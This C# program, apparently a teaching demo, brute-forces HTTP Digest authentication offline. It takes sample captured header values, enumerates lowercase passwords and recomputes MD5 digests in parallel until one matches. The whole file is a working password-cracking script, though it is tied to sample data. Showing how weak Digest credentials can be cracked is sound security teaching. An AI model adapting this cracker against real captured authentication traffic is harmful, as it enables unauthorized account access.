using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BruteforceAttacker
{
    class Program
    {
        static void Main(string[] args)
        {
            Header header = new Header()
            {
                UserName = "john",
                Realm = "RealmOfBadri",
                Nonce = "932444f708e9c1e5391aad0e849ea201",
                Uri = "/api/values",
                Cnonce = "968ffba69bfc304eabaebffc10d56a0a",
                NounceCounter = "00000001",
                Response = "4d0b1211f1024ec616d55ac8312f5f46",
                Method = "GET"
            };

            DateTime start = DateTime.Now;

            Parallel.ForEach<string>(GeneratePassword(), (password, loopState) =>
            {
                if (IsMatch(header, password))
                {
                    Console.WriteLine("Gotcha ---> " + password);
                    loopState.Break();
                }
            });

            DateTime end = DateTime.Now;
            Console.WriteLine((end - start).TotalSeconds + " seconds");

        }

        static IEnumerable<string> GeneratePassword(IEnumerable<string> input = null)
        {
            // ASCII a is 97 and I need the next 26 letters for a - z
            var range = Enumerable.Range(97, 26);

            input = input ?? range.Select(n => char.ConvertFromUtf32(n));

            foreach (var password in input)
                yield return password;

            var appendedList = input.SelectMany(x => range.Select(n => x + char.ConvertFromUtf32(n)));

            foreach (var password in GeneratePassword(appendedList))
                yield return password;
        }

        static bool IsMatch(Header header, string password)
        {
            string ha1 = String.Format("{0}:{1}:{2}",
                header.UserName,
                header.Realm,
                password).ToMD5Hash();

            string ha2 = "347c9fe6471afafd1ac2c5551ada479f";

            string computedResponse = String.Format("{0}:{1}:{2}:{3}:{4}:{5}",
                ha1,
                header.Nonce,
                header.NounceCounter,
                header.Cnonce,
                "auth",
                ha2).ToMD5Hash();

            return (String.CompareOrdinal(header.Response, computedResponse) == 0);
        }


    }
}
